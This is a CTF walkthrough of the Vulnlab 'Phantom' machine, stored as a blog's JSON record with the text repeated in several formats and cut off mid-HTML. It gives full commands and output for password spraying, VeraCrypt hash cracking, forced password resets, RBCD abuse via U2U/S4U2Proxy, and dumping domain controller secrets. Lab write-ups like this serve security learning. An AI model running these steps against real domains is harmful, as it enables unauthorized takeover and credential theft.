RBCD (resource-based constrained delegation), which can allow us to compromise the domain controller. We've done this exploit in the past on other machines, and it seems as though this is the same type of attack path here.\n\n# RBCD Through SPN-less User\n\nHowever, there is one primary issue that we face for this machine. Our domain user has a MAQ of 0, meaning they cannot create domain computers that are needed for exploiting RBCD. \n\n```\n└─$ crackmapexec ldap 10.10.103.169 -u crose -p 'Password123@' -M maq\nSMB         10.10.103.169   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.103.169   389    DC               [+] phantom.vl\\crose:Password123@ \nMAQ         10.10.103.169   389    DC               [*] Getting the MachineAccountQuota\nMAQ         10.10.103.169   389    DC               MachineAccountQuota: 0\n```\n\nFurthermore, all of the users that we've previously had access to have a MAQ of 0, and there doesn't seem to be any other users that we can escalate our privileges to. (This is due to the fact that the three users that we can compromise as `svc_sspr` are the only domain users that seem to have outbound object control rights over another object)\n\nNormally this would be as far as you'd be able to get, but there is actually something that we can exploit given that we have the `AllowedToActOn` attribute against the DC.\n\nCredit goes out to the article found [here](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) and[ here](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) discovered by [James Forshaw](https://x.com/tiraniddo). There is actually a method that we can use to exploit RBCD, though it involves finding our current users ticket session key along with changing their current password to that key.\n\nAt a low-level, if we are able to obtain the ticket session key and change that key to be the password hash of our controlled user, we can utilize User-2-User authentication to trick the DC into delegating a service ticket to us. We can combine both U2U and S4U2Proxy to obtain this ticket, and then use it to dump the LSA secrets of the domain controller. This is due to how the KDC interprets ticket session keys that are passed in as NT hashes for a user, allowing them to be treated as computer objects in a sense.\n\nSo to start, we'll get the current TGT of the user in order to discover the ticket session key.\n\n```\n└─$ impacket-getTGT -hashes :$(pypykatz crypto nt 'Password123@') phantom.vl/crose \nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Saving ticket in crose.ccache\n```\n\nWe can then use [describeTicket.py](https://github.com/fortra/impacket/blob/master/examples/describeTicket.py) to obtain the ticket session key based on the service ticket for this user. (Note that the ticket session key will be different for your instance of this machine)\n\n```\n└─$ python3 describeTicket.py crose.ccache | grep 'Ticket Session Key'\n[*] Ticket Session Key            : 4abd87ab347a96df9a497689a79bfd5c\n```\n\nNow let's change the user's password once more to match the hash of the ticket session key that we just received.\n\n```\n└─$ impacket-smbpasswd -newhashes :4abd87ab347a96df9a497689a79bfd5c phantom.vl/crose:'Password123@'@dc.phantom.vl\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n===============================================================================\n  Warning: This functionality will be deprecated in the next Impacket version  \n===============================================================================\n\n[*] NTLM hashes were changed successfully.\n```\n\nNow that the NTLM hash was set with the same value of our ticket session key, we should be able to use RBCD as intended.\n\n```\n└─$ impacket-rbcd -delegate-from 'crose' -delegate-to 'DC$' -dc-ip 10.10.103.169 -action 'write' 'phantom.vl'/'crose' -hashes :4abd87ab347a96df9a497689a79bfd5c\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] crose can now impersonate users on DC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     crose        (S-1-5-21-4029599044-1972224926-2225194048-1126)\n```\n\nNow that the account is able to delegate on behalf of the DC, we can request a service ticket as we normally would with our controlled user. The only difference here is that we'll use the `-u2u` option so that the KDC interprets our login attempt as a domain user authentication attempt. We'll also impersonate the Administrator account so that we can dump the secrets of the domain controller.\n\nMake sure to set your Kerberos global authentication variable to the `crose` ticket that we produced earlier.\n\n```\n└─$ export KRB5CCNAME=crose.ccache\n\n└─$ impacket-getST -u2u -impersonate Administrator -spn 'cifs/dc.phantom.vl' -k -no-pass phantom.vl/'crose'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Impersonating Administrator\n[*] Requesting S4U2self+U2U\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache\n```\n\nNow that we have a service ticket for the Administrator user, we can dump the secrets of the domain controller with `impacket-secretsdump`.\n\n```\n└─$ export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache\n\n└─$ impacket-secretsdump -k dc.phantom.vl\n......\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nNote that the local SAM hash for the Administrator account will not work if you try to PTH. The extracted Administrator hash from the domain credential dump should have the hash you are looking for.\n\nAs seen from the above, we were able to pull the Administrator NT hash and can now use it to authenticate to the machine through WinRM.\n\n```\n└─$ evil-winrm --ip 10.10.103.169 -u 'Administrator' -H '[...snip...]'\nEvil-WinRM shell v3.5  \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat ..\\Desktop\\root.txt\nVL[...snip...]\n```\n\nNow that we were able to read the root flag, this means that we have successfully compromised this machine!\n\n# Conclusion\n\nThis machine was relatively difficult when it came to problem-solving, as you needed to have a grasp of how password creation was conceived in general by regular users in the real-world. Though this may not be a situation you'll see a lot, it is always something that is good to test for. The AD portion was also really interesting, as prior to this machine I did not know you could exploit RBCD when a user does not have control over a domain computer.\n\nBig props to ar0x4, this machine was great.\n\n# Resources\n\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://veracrypt.eu/en/Downloads.html\nhttps://wiki.vulnlab.com/guidance/medium/phantom\nhttps://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd\nhttps://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html\nhttps://x.com/tiraniddo\nhttps://github.com/fortra/impacket/blob/master/examples/describeTicket.py\n\n","source":"_posts/phantom.md","raw":"---\ntitle: Phantom - Vulnlab\ndate: 2024-07-14 01:29:45\ntags: [vulnlab, Medium]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: Phantom is the latest machine that was released as of 7/13/2024. This machine involved Active Directory penetration testing along with some password decryption paths. I originally tried going for first blood on this machine, however the encryption portion was a little difficult for me and I ended up completing it a couple of days later. Cheers and thanks to the people that I worked alongside for this machine - you know who you are.\ncover: /images/vulnlab/phantom-vl/phantom_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nPhantom is the latest machine that was released as of 7/13/2024. This machine involved Active Directory penetration testing along with some password decryption paths. I originally tried going for first blood on this machine, however the encryption portion was a little difficult for me and I ended up completing it a couple of days later. Cheers and thanks to the people that I worked alongside for this machine - you know who you are.\n\n# Enumeration\n\nLet's run an NMAP scan, our entry point to the domain controller is `10.10.103.169`.\n\n```\n└─$ sudo nmap 10.10.103.169\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 14:01 EDT\nNmap scan report for 10.10.103.169\nHost is up (0.11s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n\nNmap done: 1 IP address (1 host up) scanned in 17.87 seconds\n```\n\nIt seems to be a relatively standard AD machine. I doubt we'll need to be doing any web-app testing for this, as there does not seem to be any web ports open. The domain is `phantom.vl` and the DC DNS name is `dc.phantom.vl`, so we'll add these to our `/etc/hosts` file for later use.\n\nWe'll start with SMB first to see if there are anything we can pull from the shares.\n\n```\n└─$ smbclient -L 10.10.103.169 -N         \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        Departments Share Disk      \n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Public          Disk      \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.103.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nIt seems that we have access to SMB through null authentication, and we are able to view a few of the shares that are available on the machine.\n\nThis is an immediate pivot to Kerberos, as we can essentially brute force all of the domain SIDs (including domain users) through `lookupsid` due to the fact that we can login to SMB without a password and view the shares.\n\n```\n└─$ impacket-lookupsid -domain-sids -no-pass -target-ip 10.10.103.169 phantom.vl/'daz'@10.10.103.169\n```\n\nThis should return a list of all of the SIDs, some of which are domain users. We can easily convert this into a user list using some filtering and basic regex. \n\n```\n└─$ impacket-lookupsid -domain-sids -no-pass -target-ip 10.10.103.169 phantom.vl/'daz'@10.10.103.169 | cut -d '\\' -f 2 | awk 'NR >= 29 {print $1}' > full_ul.txt\n```\n\nThis should convert the respective domain users (including a few false positives) into a list. We'll be able to use this once we receive a password for a user.\n\n# Email Foothold\n\nSince we have enumerated access to a few of the SMB shares, we can see specifically if any of them contain any files that we have read access on.\n\nWe don't have access to the `Department Share` as a null user, and `SYSVOL`/`NETLOGON` don't seem to have anything of use either. Let's look at the `Public` share.\n\n```\n└─$ smbclient \\\\\\\\10.10.103.169\\\\Public -N            \nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Thu Jul 11 11:03:14 2024\n  ..                                DHS        0  Sun Jul  7 04:39:30 2024\n  tech_support_email.eml              A    14565  Sat Jul  6 12:08:43 2024\n\n6127103 blocks of size 4096. 1085569 blocks available\nsmb: \\> get tech_support_email.eml \ngetting file \\tech_support_email.eml of size 14565 as tech_support_email.eml (28.2 KiloBytes/sec) (average 28.2 KiloBytes/sec)\n```\n\nThere seems to be a `.eml` file within this directory, containing a message from what seems to be tech support. A base64 encoded attachment was provided in this email, though it is unintelligible from our perspective on Linux (if we try to decode it with basic tools). I instead opted to copy it to my Windows host and open it through Outlook.\n\n![](/images/vulnlab/phantom-vl/b.png)\n\nIt seems that a basic password is provided for new users with this tech support document. This should be the default password for new users that are onboarded, so we can potentially test this against the user list that we currently have.\n\n```\n└─$ crackmapexec ldap 10.10.103.169 -u full_ul.txt -p '(EMAIL PASSWORD)' --continue-on-success\n......\nLDAP        10.10.103.169   389    DC               [+] phantom.vl\\ibryant:(EMAIL PASSWORD)\n```\n\nYou'll receive a few false positives when testing these credentials against the domain, as denoted by the unsuccessful bind message under each false positive.\n\nThat being said, a user/password match did seem to return within a successful bind for `ibryant`. Since they are successfully able to authenticate to LDAP, we can dump the domain using Bloodhound and the [Python ingestor](https://github.com/dirkjanm/BloodHound.py). \n\n```\n└─$ bloodhound-python -d 'phantom.vl' -u 'ibryant' -p '(IBRYANT PASSWORD)' -c all -ns 10.10.103.169 --zip\nINFO: Compressing output into 20240713234621_bloodhound.zip\n```\n\nAfter booting up Bloodhound and checking out our user's node, it does not seem that we have any outbound object controls/privileges over any other domain objects. Having the Bloodhound graph is still helpful for us later down the attack path for other users we compromise.\n\nI was able to find out after some password usage against SMB that we now have access to the `Department Share` SMB share with `ibryant`. Let's see what we can find within this share.\n\n```\n└─$ smbclient \\\\\\\\10.10.103.169\\\\Departments\\ Share -U 'ibryant'\nPassword for [WORKGROUP\\ibryant]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sat Jul  6 12:25:31 2024\n  ..                                DHS        0  Sun Jul  7 04:39:30 2024\n  Finance                             D        0  Sat Jul  6 12:25:11 2024\n  HR                                  D        0  Sat Jul  6 12:21:31 2024\n  IT                                  D        0  Thu Jul 11 10:59:02 2024\n\n6127103 blocks of size 4096. 1178542 blocks available\n```\n\nI did some spidering on this share, and it seems that there is notably a bit of information for the next exploit within the `IT` directory.\n\n# Cracking VeraCrypt Volume Passwords\n\nWithin this directory, exists a `veracrypt` Linux installation package along with a few other programs such as `TeamViewer` and `mRemoteNG`.\n\nWithin the `Backups` directory in this folder, seems to be a file with a `.hc` extension.\n\n```\nsmb: \\IT\\> cd Backup\nsmb: \\IT\\Backup\\> ls\n  .                                   D        0  Sat Jul  6 14:04:34 2024\n  ..                                  D        0  Thu Jul 11 10:59:02 2024\n  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 14:04:14 2024\n\n6127103 blocks of size 4096. 1178408 blocks available\n```\n\nDoing some research on this file led me to interpret that this was an encrypted VeraCrypt volume. VeraCrypt in particular is an open disk encryption application that allows for further protection against files and filesystems, locking them behind encryption algorithms.\n\nThe encryption volume that we seem to have on our hands is a volume/filesystem related to an IT backup that the IT team (presumably the team the `ibryant` is being onboarded to) had previously conducted on `July 6`.\n\nI set up `veracrypt` locally on my Kali machine, you could use the installation package that is within the `IT` directory or install it from the [VeraCrypt](https://veracrypt.eu/en/Downloads.html) website.\n\n![](/images/vulnlab/phantom-vl/c.png)\n\nIt seems that we'll need to use a password or keyfile in order to mount this volume. This is one of the main security features that VeraCrypt offers, so we'll need to find the password to mount it.\n\nI did a bit of enumeration on the file share, and it doesn't seem that anything points towards a password that we could use. Password reusage from passwords such as `ibryant`'s password also does not seem to result in anything success. At this point - we could potentially brute force for this password, though we don't have much to build off of in terms of a password policy that these users might set this to. \n\nLuckily enough, `hashcat` offers a numerous amount of VeraCrypt hash cracking algorithms. The default encryption algorithm that VeraCrypt can use is `AES/SHA512 (legacy)`, which has a hash ID of 13721.\n\nNext, we'll need to define a rule for our password brute force. If we think about it from a real-world sense, there are common password policies that involve simple password mutation, such as date-of-birth or the users last name. Passwords also generally involve a few special characters and a capital letter.\n\nThe password mutation I decided to try in particular consisted of the following password attributes. The Wiki hint also solidifies this factor on the [machine's page](https://wiki.vulnlab.com/guidance/medium/phantom).\n\n* Capital letter, preferably the first alphanumeric character in the password.\n* Company/Machine name.\n* Year, can revolve of any permutation from 2022-2024 (based on the current year).\n* Special character (any)\n\nI started by creating a wordlist based on common strings from the machine name, ending up with a result such as this.\n\n```\n└─$ cat phantom.txt             \nphantom\nPhantom\nPHANTOM\nPHANT0M\nphant0m\nphantom.vl\nPHANTOM.VL\nphant0m.vl\nPHANT0M.vl\nPh4nt0m\nPH4NT0M\n```\n\nNow that we have our hash ID and our wordlist, the last thing that we'll need is our hashcat rule. I created a simple rule file that hashcat could parse based off of the expressions that it uses. In a rule file, you can generally state the ruleset appended to the end of each string in your wordlist like this.\n\n```\n└─$ cat phantom.rule \n$2 $0 $2 $3 $$\n$2 $0 $2 $3 $&\n$2 $0 $2 $3 $@\n$2 $0 $2 $3 $!\n$2 $0 $2 $3 $#\n$2 $0 $2 $3 $%\n$2 $0 $2 $3 $^\n$2 $0 $2 $3 $*\n$2 $0 $2 $3 $(\n$2 $0 $2 $3 $)\n$2 $0 $2 $3 $-\n$2 $0 $2 $3 $_\n$2 $0 $2 $3 $=\n$2 $0 $2 $3 $+\n```\n\nThis essentially states that each string will be appended by the year `2023` along with each special character on a regular keyboard (or at least most of them).\n\nNow that we have all of the components needed, we can proceed with our hash cracking. By default, the first 512 bytes of an encrypted VeraCrypt volume contain the password of the volume, however `hashcat` can parse this out if we give it the raw volume.\n\n```\n└─$ hashcat -a 0 -m 13721 IT_BACKUP_201123.hc phantom.txt -r phantom.rule \nhashcat (v6.2.6) starting\n......\nIT_BACKUP_201123.hc:[...snip...]                         \n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))\nHash.Target......: IT_BACKUP_201123.hc\n```\n\nAs you can see, we were successfully able to crack the hash for the volume and can now mount the volume. The method that we used can be seen in real-world situations, so it was nice to test out and can really get you thinking on how a person might think to create a password.\n\nNow that we have the password, we should be able to mount the volume to a location on our local system to see its contents.\n\n![](/images/vulnlab/phantom-vl/d.png)\n\nAs you can see, it was saved under `/media/veracrypt1`.\n\n# Credential Hunting\n\nGiven that `veracrypt` only allocates a relatively small amount of storage to this mount (you may see a few full storage errors), we can simply copy all of the contents of this mount to a directory within our `/` filesystem. You can do so easily with `sudo cp -r * (DESIRED FILEPATH)`.\n\nDoing some enumeration on the volume brought me to an interesting file that contained a password for a user.\n\n```\nvpn {\n    sstp {\n        authentication {\n            local-users {\n                username lstanley {\n                    password \"[...snip...]\"\n                }\n            }\n```\n\nIf you unzip and decompress all of the archives within the volume you mounted, this will be within `/config/archive/config.boot`. It seems that after a bit of credential hunting, we were able to retrieve the password to the `lstanley` user.\n\nWhile we would assume this would be for their user, I decided to run a `crackmapexec` scan against the full user list that we have just in case it belongs to other users instead of `lstanley`.\n\n```\n└─$ crackmapexec ldap 10.10.103.169 -u full_ul.txt -p '[...snip...]' --continue-on-success\n......\nLDAP        10.10.103.169   389    DC               [+] phantom.vl\\svc_sspr:[...snip...]\n```\n\nIt seems that a successful password match was found for `svc_sspr`.\n\nI also made sure to run this against WinRM, and it seems that this user is part of the `Remote Management Users` group.\n\n```\n└─$ crackmapexec winrm 10.10.103.169 -u svc_sspr -p '[...snip...]'\nSMB         10.10.103.169   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)\nHTTP        10.10.103.169   5985   DC               [*] http://10.10.103.169:5985/wsman\nWINRM       10.10.103.169   5985   DC               [+] phantom.vl\\svc_sspr:[...snip...] (Pwn3d!)\n```\n\nThis means we should be able to authenticate to WinRM using `evil-winrm` and read the first flag.\n\n```\n└─$ evil-winrm --ip 10.10.103.169 -u 'svc_sspr' -p '[...snip...]'\nEvil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\svc_sspr\\Documents> cat ..\\Desktop\\user.txt\nVL[...snip...]\n```\n\n# Domain Escalation as svc_sspr\n\nNow that we successfully have access to the machine - we could look around the filesystem to see if there are any pertinent files/applications that we could exploit. Below is a list of security checks that I performed to see if the filesystem possessed any important data.\n\n* Cached DPAPI credentials/master keys with `Seatbelt`.\n* Internal services using `netstat`.\n* Abnormal running programs with `ps`.\n* Credential Hunting on the filesystem.\n* Regular privilege escalation tactics with tools such as `PrivescCheck` and `Winpeas`.\n\nThough nothing seemed to come back with any successful results. I decided to turn my attention back to our Bloodhound graph to see if our user had any privileges over any other domain objects.\n\n![](/images/vulnlab/phantom-vl/e.png)\n\nIt seems as though `svc_sspr` has `ForceChangePassword` set over three domain users. This attribute essentially allows us to change the password of the domain user to any string of our choosing. This will allow us to take full control over this domain user and exploit any privileges that they have,\n\nWe can easily do so through RPC.\n\n```\n└─$ net rpc password \"crose\" \"Password123@\" -U \"phantom.vl\"/\"svc_sspr\"%\"(SVC_SSPR PASSWORD)\" -S \"dc.phantom.vl\"\n```\n\nThis should of theoretically changed the password for the user `crose`, and we can verify so in LDAP.\n\n```\n└─$ crackmapexec ldap 10.10.103.169 -u crose -p 'Password123@'                   \nSMB         10.10.103.169   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.103.169   389    DC               [+] phantom.vl\\crose:Password123@\n```\n\nLooks like it works, we now possess the password for this user. They don't seem to have the ability to authenticate to the filesystem, so our privilege escalation must still be through the domain.\n\n![](/images/vulnlab/phantom-vl/f.png)\n\nIt seems that this user, `crose`, is within the `ICT Security` domain group. This means that by default, they have `AllowedToActOnBehalfOfOtherIdentity` privilege over the domain controller, `DC.PHANTOM.VL`.\n\nThis privilege essentially allows us to act on behalf of the domain controller, and request for service tickets on behalf of that domain computer. This privilege in particular allows us to exploit RBCD (resource-based constrained delegation), which can allow us to compromise the domain controller. We've done this exploit in the past on other machines, and it seems as though this is the same type of attack path here.\n\n# RBCD Through SPN-less User\n\nHowever, there is one primary issue that we face for this machine. Our domain user has a MAQ of 0, meaning they cannot create domain computers that are needed for exploiting RBCD. \n\n```\n└─$ crackmapexec ldap 10.10.103.169 -u crose -p 'Password123@' -M maq\nSMB         10.10.103.169   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.103.169   389    DC               [+] phantom.vl\\crose:Password123@ \nMAQ         10.10.103.169   389    DC               [*] Getting the MachineAccountQuota\nMAQ         10.10.103.169   389    DC               MachineAccountQuota: 0\n```\n\nFurthermore, all of the users that we've previously had access to have a MAQ of 0, and there doesn't seem to be any other users that we can escalate our privileges to. (This is due to the fact that the three users that we can compromise as `svc_sspr` are the only domain users that seem to have outbound object control rights over another object)\n\nNormally this would be as far as you'd be able to get, but there is actually something that we can exploit given that we have the `AllowedToActOn` attribute against the DC.\n\nCredit goes out to the article found [here](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) and[ here](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) discovered by [James Forshaw](https://x.com/tiraniddo). There is actually a method that we can use to exploit RBCD, though it involves finding our current users ticket session key along with changing their current password to that key.\n\nAt a low-level, if we are able to obtain the ticket session key and change that key to be the password hash of our controlled user, we can utilize User-2-User authentication to trick the DC into delegating a service ticket to us. We can combine both U2U and S4U2Proxy to obtain this ticket, and then use it to dump the LSA secrets of the domain controller. This is due to how the KDC interprets ticket session keys that are passed in as NT hashes for a user, allowing them to be treated as computer objects in a sense.\n\nSo to start, we'll get the current TGT of the user in order to discover the ticket session key.\n\n```\n└─$ impacket-getTGT -hashes :$(pypykatz crypto nt 'Password123@') phantom.vl/crose \nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Saving ticket in crose.ccache\n```\n\nWe can then use [describeTicket.py](https://github.com/fortra/impacket/blob/master/examples/describeTicket.py) to obtain the ticket session key based on the service ticket for this user. (Note that the ticket session key will be different for your instance of this machine)\n\n```\n└─$ python3 describeTicket.py crose.ccache | grep 'Ticket Session Key'\n[*] Ticket Session Key            : 4abd87ab347a96df9a497689a79bfd5c\n```\n\nNow let's change the user's password once more to match the hash of the ticket session key that we just received.\n\n```\n└─$ impacket-smbpasswd -newhashes :4abd87ab347a96df9a497689a79bfd5c phantom.vl/crose:'Password123@'@dc.phantom.vl\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n===============================================================================\n  Warning: This functionality will be deprecated in the next Impacket version  \n===============================================================================\n\n[*] NTLM hashes were changed successfully.\n```\n\nNow that the NTLM hash was set with the same value of our ticket session key, we should be able to use RBCD as intended.\n\n```\n└─$ impacket-rbcd -delegate-from 'crose' -delegate-to 'DC$' -dc-ip 10.10.103.169 -action 'write' 'phantom.vl'/'crose' -hashes :4abd87ab347a96df9a497689a79bfd5c\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty\n[*] Delegation rights modified successfully!\n[*] crose can now impersonate users on DC$ via S4U2Proxy\n[*] Accounts allowed to act on behalf of other identity:\n[*]     crose        (S-1-5-21-4029599044-1972224926-2225194048-1126)\n```\n\nNow that the account is able to delegate on behalf of the DC, we can request a service ticket as we normally would with our controlled user. The only difference here is that we'll use the `-u2u` option so that the KDC interprets our login attempt as a domain user authentication attempt. We'll also impersonate the Administrator account so that we can dump the secrets of the domain controller.\n\nMake sure to set your Kerberos global authentication variable to the `crose` ticket that we produced earlier.\n\n```\n└─$ export KRB5CCNAME=crose.ccache\n\n└─$ impacket-getST -u2u -impersonate Administrator -spn 'cifs/dc.phantom.vl' -k -no-pass phantom.vl/'crose'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Impersonating Administrator\n[*] Requesting S4U2self+U2U\n[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache\n```\n\nNow that we have a service ticket for the Administrator user, we can dump the secrets of the domain controller with `impacket-secretsdump`.\n\n```\n└─$ export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache\n\n└─$ impacket-secretsdump -k dc.phantom.vl\n......\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nNote that the local SAM hash for the Administrator account will not work if you try to PTH. The extracted Administrator hash from the domain credential dump should have the hash you are looking for.\n\nAs seen from the above, we were able to pull the Administrator NT hash and can now use it to authenticate to the machine through WinRM.\n\n```\n└─$ evil-winrm --ip 10.10.103.169 -u 'Administrator' -H '[...snip...]'\nEvil-WinRM shell v3.5  \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat ..\\Desktop\\root.txt\nVL[...snip...]\n```\n\nNow that we were able to read the root flag, this means that we have successfully compromised this machine!\n\n# Conclusion\n\nThis machine was relatively difficult when it came to problem-solving, as you needed to have a grasp of how password creation was conceived in general by regular users in the real-world. Though this may not be a situation you'll see a lot, it is always something that is good to test for. The AD portion was also really interesting, as prior to this machine I did not know you could exploit RBCD when a user does not have control over a domain computer.\n\nBig props to ar0x4, this machine was great.\n\n# Resources\n\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://veracrypt.eu/en/Downloads.html\nhttps://wiki.vulnlab.com/guidance/medium/phantom\nhttps://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd\nhttps://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html\nhttps://x.com/tiraniddo\nhttps://github.com/fortra/impacket/blob/master/examples/describeTicket.py\n\n","slug":"phantom","published":1,"updated":"2024-07-14T05:34:24.465Z","comments":1,"layout":"post","photos":[],"_id":"clyl4fcq500007quf7u3idsg4","content":"<p>Phantom is the latest machine that was released as of 7&#x2F;13&#x2F;2024. This machine involved Active Directory penetration testing along with some password decryption paths. I originally tried going for first blood on this machine, however the encryption portion was a little difficult for me and I ended up completing it a couple of days later. Cheers and thanks to the people that I worked alongside for this machine - you know who you are.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s run an NMAP scan, our entry point to the domain controller is <code>10.10.103.169</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.103.169</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 14:01 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.103.169</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 988 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.87 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems to be a relatively standard AD machine. I doubt we’ll need to be doing any web-app testing for this, as there does not seem to be any web ports open. The domain is <code>phantom.vl</code> and the DC DNS name is <code>dc.phantom.vl</code>, so we’ll add these to our <code>/etc/hosts</code> file for later use.</p>\n<p>We’ll start with SMB first to see if there are anything we can pull from the shares.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.103.169 -N         </span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">        ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">        C$              Disk      Default share</span><br><span class=\"line\">        Departments Share Disk      </span><br><span class=\"line\">        IPC$            IPC       Remote IPC</span><br><span class=\"line\">        NETLOGON        Disk      Logon server share </span><br><span class=\"line\">        Public          Disk      </span><br><span class=\"line\">        SYSVOL          Disk      Logon server share </span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.103.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>It seems that we have access to SMB through null authentication, and we are able to view a few of the shares that are available on the machine.</p>\n<p>This is an immediate pivot to Kerberos, as we can essentially brute force all of the domain SIDs (including domain users) through <code>lookupsid</code> due to the fact that we can login to SMB without a password and view the shares.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-lookupsid -domain-sids -no-pass -target-ip 10.10.103.169 phantom.vl/&#x27;daz&#x27;@10.10.103.169</span><br></pre></td></tr></table></figure>\n\n<p>This should return a list of all of the SIDs, some of which are domain users. We can easily convert this into a user list using some filtering and basic regex. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-lookupsid -domain-sids -no-pass -target-ip 10.10.103.169 phantom.vl/&#x27;daz&#x27;@10.10.103.169 | cut -d &#x27;\\&#x27; -f 2 | awk &#x27;NR &gt;= 29 &#123;print $1&#125;&#x27; &gt; full_ul.txt</span><br></pre></td></tr></table></figure>\n\n<p>This should convert the respective domain users (including a few false positives) into a list. We’ll be able to use this once we receive a password for a user.</p>\n<h1 id=\"Email-Foothold\"><a href=\"#Email-Foothold\" class=\"headerlink\" 